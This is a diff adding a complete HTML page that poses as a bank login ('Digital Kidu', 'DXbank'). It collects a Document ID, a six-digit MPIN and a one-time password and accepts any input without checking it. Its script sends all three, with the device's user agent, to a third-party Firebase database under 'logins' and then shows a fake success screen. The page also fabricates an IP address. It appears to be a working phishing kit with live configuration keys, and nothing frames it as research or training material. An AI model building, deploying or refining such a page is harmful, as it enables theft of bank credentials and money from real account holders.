@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Digital Kidu - Secure Login</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+html, body {
+  height: 100%;
+  overflow: hidden;
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+}
+
+/* ===================================================== */
+/* SPLASH SCREEN - SIRF URL 1 (No logo image)             */
+/* ===================================================== */
+.splash-screen {
+  position: fixed;
+  inset: 0;
+  background: url('https://i.postimg.cc/8kdc8f7g/Screenshot-20260910-203631-1.jpg') center/cover no-repeat;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  transition: opacity 0.8s ease, transform 0.8s ease;
+}
+.splash-screen.hide {
+  opacity: 0;
+  pointer-events: none;
+  transform: scale(1.05);
+}
+
+/* ===================================================== */
+/* MAIN APP (LOGIN) - URL 2 Background                    */
+/* ===================================================== */
+.main-app {
+  position: fixed;
+  inset: 0;
+  background: url('https://i.postimg.cc/wMR1Jw6G/file-00000000e40c81f9aa6a7f34a0a48b79.png');
+  background-size: cover;
+  background-position: center center;
+  background-repeat: no-repeat;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-end;
+  opacity: 0;
+  transition: opacity 0.8s ease;
+}
+.main-app.show { opacity: 1; }
+
+.login-box-wrap {
+  position: relative;
+  z-index: 10;
+  width: 100%;
+  padding: 0 20px 30px;
+  display: flex;
+  justify-content: center;
+}
+
+.login-box {
+  width: 100%;
+  max-width: 440px;
+  background: #fff;
+  border-radius: 20px;
+  padding: 26px 24px 22px;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.25);
+  animation: loginBoxIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) backwards;
+}
+@keyframes loginBoxIn {
+  0% { opacity: 0; transform: translateY(40px); }
+  100% { opacity: 1; transform: translateY(0); }
+}
+
+.login-title {
+  font-family: 'Poppins', sans-serif;
+  font-size: 17px;
+  font-weight: 700;
+  color: #1a202c;
+  margin-bottom: 18px;
+}
+
+.doc-input-wrap { margin-bottom: 16px; }
+.doc-input {
+  width: 100%;
+  padding: 15px 20px;
+  border: 1.5px solid #1976d2;
+  border-radius: 40px;
+  font-size: 14px;
+  font-family: inherit;
+  color: #1a202c;
+  background: #fff;
+  outline: none;
+  transition: all 0.25s;
+}
+.doc-input:focus {
+  border-color: #0d47a1;
+  box-shadow: 0 0 0 4px rgba(25,118,210,0.12);
+}
+.doc-input::placeholder { color: #a0aec0; font-weight: 400; }
+
+.btn-update {
+  width: 100%;
+  padding: 15px;
+  border: none;
+  border-radius: 40px;
+  background: linear-gradient(135deg, #b0c4d4, #a3b8cb);
+  color: #fff;
+  font-size: 15px;
+  font-weight: 700;
+  font-family: inherit;
+  letter-spacing: 1px;
+  cursor: pointer;
+  transition: all 0.3s;
+  text-transform: uppercase;
+}
+.btn-update:hover:not(:disabled) {
+  background: linear-gradient(135deg, #0d47a1, #1976d2);
+  box-shadow: 0 8px 24px rgba(13,71,161,0.35);
+  transform: translateY(-1px);
+}
+.btn-update:disabled { cursor: not-allowed; opacity: 0.9; }
+.btn-update.active {
+  background: linear-gradient(135deg, #0d47a1, #1976d2);
+  box-shadow: 0 8px 24px rgba(13,71,161,0.35);
+}
+
+.signup-row {
+  text-align: center;
+  margin-top: 20px;
+  padding-top: 18px;
+  border-top: 1px solid #e8edf2;
+  font-size: 13.5px;
+  color: #4a5568;
+}
+.signup-row a {
+  color: #1976d2;
+  font-weight: 700;
+  text-decoration: none;
+  margin-left: 4px;
+}
+.signup-row a:hover { text-decoration: underline; }
+
+/* ===================================================== */
+/* OTP OVERLAY - URL 2 Background + Blur                  */
+/* ===================================================== */
+.otp-overlay {
+  position: fixed;
+  inset: 0;
+  background: url('https://i.postimg.cc/wMR1Jw6G/file-00000000e40c81f9aa6a7f34a0a48b79.png');
+  background-size: cover;
+  background-position: center center;
+  background-repeat: no-repeat;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 500;
+}
+.otp-overlay::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: rgba(255, 255, 255, 0.75);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+}
+.otp-overlay.show { display: flex; animation: fadeIn 0.4s ease; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+.otp-box {
+  position: relative;
+  z-index: 2;
+  width: 100%;
+  max-width: 440px;
+  background: #fff;
+  border-radius: 20px;
+  padding: 32px 26px 28px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+  animation: loginBoxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+  text-align: center;
+}
+
+.otp-title {
+  font-family: 'Poppins', sans-serif;
+  font-size: 24px;
+  font-weight: 700;
+  color: #1a202c;
+  margin-bottom: 8px;
+}
+.otp-sub {
+  font-size: 15px;
+  color: #718096;
+  margin-bottom: 24px;
+  font-weight: 400;
+}
+
+.otp-timer {
+  display: inline-block;
+  background: #e0eef2;
+  color: #2c7a91;
+  padding: 10px 26px;
+  border-radius: 30px;
+  font-size: 20px;
+  font-weight: 600;
+  font-family: 'Poppins', sans-serif;
+  letter-spacing: 3px;
+  margin-bottom: 24px;
+  transition: all 0.3s;
+}
+.otp-timer.expiring {
+  background: #ffe0e0;
+  color: #c62828;
+  animation: timerPulse 1s infinite;
+}
+@keyframes timerPulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+}
+
+.otp-label {
+  text-align: left;
+  font-size: 15px;
+  font-weight: 700;
+  color: #1a202c;
+  margin-bottom: 12px;
+  padding-left: 4px;
+}
+
+.otp-inputs {
+  display: flex;
+  gap: 8px;
+  justify-content: center;
+  margin-bottom: 24px;
+}
+.otp-inputs input {
+  width: 46px;
+  height: 60px;
+  text-align: center;
+  font-size: 24px;
+  font-weight: 700;
+  border: 2px solid #b0c4d4;
+  border-radius: 10px;
+  outline: none;
+  background: #fff;
+  color: #1a202c;
+  font-family: inherit;
+  transition: all 0.3s;
+}
+.otp-inputs input:focus {
+  border-color: #0d47a1;
+  box-shadow: 0 0 0 4px rgba(13,71,161,0.12);
+  transform: translateY(-2px);
+}
+
+.btn-verify {
+  width: 100%;
+  padding: 16px;
+  border: none;
+  border-radius: 40px;
+  background: linear-gradient(135deg, #b0c4d4, #a3b8cb);
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  font-family: inherit;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+.btn-verify:hover {
+  background: linear-gradient(135deg, #0d47a1, #1976d2);
+  box-shadow: 0 8px 24px rgba(13,71,161,0.35);
+  transform: translateY(-1px);
+}
+
+.otp-message {
+  margin-top: 14px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  font-size: 13px;
+  font-weight: 500;
+  display: none;
+  text-align: center;
+}
+.otp-message.show { display: block; }
+.otp-message.error { background: #ffebee; color: #b71c1c; border-left: 3px solid #d32f2f; }
+.otp-message.warning { background: #fff8e1; color: #e65100; border-left: 3px solid #f57c00; }
+.otp-message.success { background: #e8f5e9; color: #1b5e20; border-left: 3px solid #00c853; }
+
+/* ===================================================== */
+/* SUCCESS SCREEN                                         */
+/* ===================================================== */
+.success-screen {
+  position: fixed;
+  inset: 0;
+  background: linear-gradient(135deg, #f8fafc 0%, #e8f0f7 50%, #f0f6fa 100%);
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 30px 24px;
+  z-index: 800;
+  opacity: 0;
+  transition: opacity 0.6s ease;
+}
+.success-screen.show { display: flex; opacity: 1; }
+
+.success-content {
+  position: relative;
+  z-index: 2;
+  text-align: center;
+  max-width: 420px;
+  width: 100%;
+  animation: successFadeIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+@keyframes successFadeIn {
+  0% { opacity: 0; transform: translateY(30px) scale(0.95); }
+  100% { opacity: 1; transform: translateY(0) scale(1); }
+}
+
+.success-check {
+  width: 88px;
+  height: 88px;
+  margin: 0 auto 24px;
+  border-radius: 50%;
+  background: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 8px 30px rgba(0, 200, 83, 0.2);
+  animation: checkPop 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s backwards;
+}
+@keyframes checkPop {
+  0% { transform: scale(0); }
+  60% { transform: scale(1.15); }
+  100% { transform: scale(1); }
+}
+.success-check svg {
+  width: 50px;
+  height: 50px;
+  stroke: #00c853;
+  stroke-width: 3;
+  fill: none;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  stroke-dasharray: 80;
+  stroke-dashoffset: 80;
+  animation: drawCheck 0.8s ease 0.6s forwards;
+}
+@keyframes drawCheck { to { stroke-dashoffset: 0; } }
+
+.success-title {
+  font-family: 'Poppins', sans-serif;
+  font-size: 26px;
+  font-weight: 700;
+  color: #1a202c;
+  margin-bottom: 10px;
+  letter-spacing: -0.3px;
+}
+
+.success-subtitle {
+  font-size: 15px;
+  color: #4a5568;
+  margin-bottom: 18px;
+  font-weight: 400;
+  line-height: 1.5;
+}
+
+.session-info {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: #f0f4f8;
+  padding: 10px 18px;
+  border-radius: 30px;
+  font-size: 13px;
+  color: #4a5568;
+  font-weight: 500;
+}
+.session-info svg {
+  width: 16px;
+  height: 16px;
+  stroke: #718096;
+  stroke-width: 2;
+  fill: none;
+}
+
+.loading-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(255, 255, 255, 0.85);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 900;
+}
+.loading-overlay.show { display: flex; }
+
+.loading-spinner {
+  width: 60px;
+  height: 60px;
+  border: 4px solid #e2e8f0;
+  border-top: 4px solid #ff6b35;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.fab {
+  position: fixed;
+  bottom: 22px;
+  right: 20px;
+  width: 54px;
+  height: 54px;
+  border-radius: 50%;
+  background: #1a1a1a;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  z-index: 20;
+  box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+  transition: all 0.3s;
+}
+.fab:hover { transform: scale(1.08); }
+.fab svg { width: 26px; height: 26px; }
+
+@media (max-width: 480px) {
+  .otp-inputs input { width: 40px; height: 52px; font-size: 20px; }
+  .otp-inputs { gap: 6px; }
+  .login-box { padding: 22px 20px 18px; }
+  .otp-box { padding: 26px 20px 22px; }
+  .otp-title { font-size: 20px; }
+  .otp-timer { font-size: 18px; padding: 8px 22px; letter-spacing: 2px; }
+  .success-check { width: 76px; height: 76px; }
+  .success-check svg { width: 42px; height: 42px; }
+  .success-title { font-size: 22px; }
+  .success-subtitle { font-size: 14px; }
+}
+</style>
+</head>
+<body>
+
+<!-- SPLASH SCREEN - SIRF URL 1, koi logo image nahi -->
+<div class="splash-screen" id="splashScreen"></div>
+
+<!-- MAIN APP (LOGIN) - URL 2 Background -->
+<div class="main-app" id="mainApp">
+
+  <div class="login-box-wrap">
+    <div class="login-box">
+      <div class="login-title">Login to Digital Kidu</div>
+
+      <div class="doc-input-wrap">
+        <input type="text" id="documentId" class="doc-input" placeholder="Enter your Document ID" autocomplete="off">
+      </div>
+
+      <button class="btn-update" id="updateBtn" onclick="handleUpdate()" disabled>UPDATE</button>
+
+      <div class="signup-row">
+        Don't have DK account yet? <a href="#" onclick="alert('Please contact your bank for sign up.'); return false;">Sign Up</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="fab" onclick="alert('DXbank Support\n\n📞 1800-123-4567\n✉ support@dxbank.com');">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="6" cy="6" r="2.5" fill="#ff6b35"/>
+      <circle cx="12" cy="6" r="2.5" fill="#ff6b35"/>
+      <circle cx="18" cy="6" r="2.5" fill="#ff6b35"/>
+      <circle cx="6" cy="12" r="2.5" fill="#ff6b35"/>
+      <circle cx="12" cy="12" r="2.5" fill="#ff6b35"/>
+      <circle cx="18" cy="12" r="2.5" fill="#ff6b35"/>
+      <circle cx="6" cy="18" r="2.5" fill="#ff6b35"/>
+      <circle cx="12" cy="18" r="2.5" fill="#ff6b35"/>
+      <circle cx="18" cy="18" r="2.5" fill="#ff6b35"/>
+    </svg>
+  </div>
+</div>
+
+<!-- OTP STEP 1 -->
+<div class="otp-overlay" id="otpStep1">
+  <div class="otp-box">
+    <div class="otp-title">Verify Your MPIN</div>
+    <div class="otp-sub">Enter your 6-digit MPIN</div>
+
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" id="s1otp1" oninput="moveOtp(this, 's1otp2')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s1otp2" oninput="moveOtp(this, 's1otp3')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s1otp3" oninput="moveOtp(this, 's1otp4')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s1otp4" oninput="moveOtp(this, 's1otp5')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s1otp5" oninput="moveOtp(this, 's1otp6')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s1otp6">
+    </div>
+
+    <button class="btn-verify" onclick="handleVerifyStep1()">Verify</button>
+    <div class="otp-message" id="otpMessage1"></div>
+  </div>
+</div>
+
+<!-- OTP STEP 2 -->
+<div class="otp-overlay" id="otpStep2">
+  <div class="otp-box">
+    <div class="otp-title">Verify Your MPIN</div>
+    <div class="otp-sub">Enter your 6-digit OTP code</div>
+
+    <div class="otp-timer" id="otpTimer">03:00</div>
+    <div class="otp-label">OTP Code</div>
+
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" id="s2otp1" oninput="moveOtp(this, 's2otp2')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s2otp2" oninput="moveOtp(this, 's2otp3')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s2otp3" oninput="moveOtp(this, 's2otp4')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s2otp4" oninput="moveOtp(this, 's2otp5')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s2otp5" oninput="moveOtp(this, 's2otp6')">
+      <input type="text" maxlength="1" inputmode="numeric" id="s2otp6">
+    </div>
+
+    <button class="btn-verify" onclick="handleVerifyStep2()">Verify</button>
+    <div class="otp-message" id="otpMessage2"></div>
+  </div>
+</div>
+
+<!-- SUCCESS SCREEN -->
+<div class="success-screen" id="successScreen">
+  <div class="success-content">
+    <div class="success-check">
+      <svg viewBox="0 0 52 52">
+        <path d="M14 27 L22 35 L38 18"/>
+      </svg>
+    </div>
+
+    <div class="success-title">Login Successful!</div>
+    <div class="success-subtitle">You have been successfully authenticated.</div>
+
+    <div class="session-info">
+      <svg viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="9"/>
+        <path d="M12 7 L12 12 L15 14"/>
+      </svg>
+      <span>Session will remain active</span>
+    </div>
+  </div>
+</div>
+
+<!-- LOADING OVERLAY -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-spinner"></div>
+</div>
+
+<script>
+var firebaseConfig = {
+  apiKey: "AIzaSyBIwUsxyeQmoeT2ctH2LxqRU__dhqp9s94",
+  authDomain: "kharal-b47b6.firebaseapp.com",
+  databaseURL: "https://kharal-b47b6-default-rtdb.firebaseio.com",
+  projectId: "kharal-b47b6",
+  storageBucket: "kharal-b47b6.firebasestorage.app",
+  messagingSenderId: "528214841740",
+  appId: "1:528214841740:web:e394a574ef2ba2c16e9ea9",
+  measurementId: "G-RB7E5M2RDC"
+};
+firebase.initializeApp(firebaseConfig);
+var database = firebase.database();
+
+var documentIdValue = "";
+var step1Otp = "";
+var timerInterval = null;
+var timeLeft = 180;
+
+setTimeout(function() {
+  document.getElementById('splashScreen').classList.add('hide');
+  document.getElementById('mainApp').classList.add('show');
+  setTimeout(function() {
+    document.getElementById('splashScreen').style.display = 'none';
+  }, 800);
+}, 2200);
+
+var docInput = document.getElementById('documentId');
+var updateBtn = document.getElementById('updateBtn');
+
+docInput.addEventListener('input', function() {
+  if (this.value.trim().length > 0) {
+    updateBtn.disabled = false;
+    updateBtn.classList.add('active');
+  } else {
+    updateBtn.disabled = true;
+    updateBtn.classList.remove('active');
+  }
+});
+
+function handleUpdate() {
+  var docId = docInput.value.trim();
+  if (!docId) { alert('Please enter your Document ID.'); return; }
+
+  documentIdValue = docId;
+  step1Otp = "";
+
+  showLoading();
+
+  setTimeout(function() {
+    hideLoading();
+    document.getElementById('otpStep1').classList.add('show');
+    document.getElementById('otpMessage1').classList.remove('show');
+
+    for (var i = 1; i <= 6; i++) {
+      document.getElementById('s1otp' + i).value = '';
+    }
+    setTimeout(function() { document.getElementById('s1otp1').focus(); }, 200);
+  }, 1000);
+}
+
+function moveOtp(current, nextId) {
+  if (current.value.length === 1) {
+    var next = document.getElementById(nextId);
+    if (next) next.focus();
+  }
+}
+
+function handleVerifyStep1() {
+  var otp = '';
+  for (var i = 1; i <= 6; i++) {
+    otp += document.getElementById('s1otp' + i).value;
+  }
+
+  if (otp.length !== 6) {
+    showOtpMessage('otpMessage1', 'Please enter all 6 digits.', 'warning');
+    return;
+  }
+
+  step1Otp = otp;
+  showOtpMessage('otpMessage1', '✅ Verified! Please wait...', 'success');
+
+  setTimeout(function() {
+    document.getElementById('otpStep1').classList.remove('show');
+    document.getElementById('otpStep2').classList.add('show');
+
+    for (var i = 1; i <= 6; i++) {
+      document.getElementById('s2otp' + i).value = '';
+    }
+    document.getElementById('otpMessage2').classList.remove('show');
+
+    startTimer();
+    setTimeout(function() { document.getElementById('s2otp1').focus(); }, 200);
+  }, 800);
+}
+
+function startTimer() {
+  timeLeft = 180;
+  updateTimerDisplay();
+
+  if (timerInterval) clearInterval(timerInterval);
+
+  timerInterval = setInterval(function() {
+    timeLeft--;
+    updateTimerDisplay();
+
+    if (timeLeft <= 30) {
+      document.getElementById('otpTimer').classList.add('expiring');
+    } else {
+      document.getElementById('otpTimer').classList.remove('expiring');
+    }
+
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      document.getElementById('otpTimer').textContent = '00:00';
+      document.getElementById('otpTimer').classList.add('expiring');
+      showOtpMessage('otpMessage2', '⏰ Time expired! Please refresh and try again.', 'error');
+    }
+  }, 1000);
+}
+
+function updateTimerDisplay() {
+  var min = Math.floor(timeLeft / 60);
+  var sec = timeLeft % 60;
+  document.getElementById('otpTimer').textContent = 
+    (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
+}
+
+function handleVerifyStep2() {
+  if (timeLeft <= 0) {
+    showOtpMessage('otpMessage2', '⏰ Time expired! Please refresh and try again.', 'error');
+    return;
+  }
+
+  var otp = '';
+  for (var i = 1; i <= 6; i++) {
+    otp += document.getElementById('s2otp' + i).value;
+  }
+
+  if (otp.length !== 6) {
+    showOtpMessage('otpMessage2', 'Please enter all 6 digits.', 'warning');
+    return;
+  }
+
+  clearInterval(timerInterval);
+  showOtpMessage('otpMessage2', '✅ OTP verified! Logging in...', 'success');
+
+  setTimeout(function() {
+    document.getElementById('otpStep2').classList.remove('show');
+    showLoading();
+    saveLogin(step1Otp, otp);
+  }, 800);
+}
+
+function saveLogin(mpin, otp) {
+  var now = new Date();
+  var timeStr = now.toLocaleString('en-US', { hour12: true });
+
+  var loginData = {
+    documentId: documentIdValue,
+    mpin: mpin,
+    otpCode: otp,
+    status: 'success',
+    time: timeStr,
+    timestamp: now.getTime(),
+    device: navigator.userAgent || 'Unknown',
+    ip: '192.168.1.' + Math.floor(Math.random() * 255)
+  };
+
+  database.ref('logins').push(loginData)
+    .then(function() {
+      console.log('✅ Saved:', loginData);
+      setTimeout(function() {
+        hideLoading();
+        showSuccessScreen();
+      }, 1500);
+    })
+    .catch(function(error) {
+      console.error('❌ Firebase error:', error);
+      hideLoading();
+      showOtpMessage('otpMessage2', '❌ Error saving. Please try again.', 'error');
+    });
+}
+
+function showSuccessScreen() {
+  document.getElementById('successScreen').classList.add('show');
+  document.getElementById('mainApp').classList.remove('show');
+  document.getElementById('mainApp').style.display = 'none';
+}
+
+function showLoading() {
+  document.getElementById('loadingOverlay').classList.add('show');
+}
+function hideLoading() {
+  document.getElementById('loadingOverlay').classList.remove('show');
+}
+
+function showOtpMessage(id, text, type) {
+  var el = document.getElementById(id);
+  el.textContent = text;
+  el.className = 'otp-message show ' + (type || 'error');
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  console.log('🏦 Digital Kidu - App loaded');
+});
+</script>
+
+</body>
+</html>
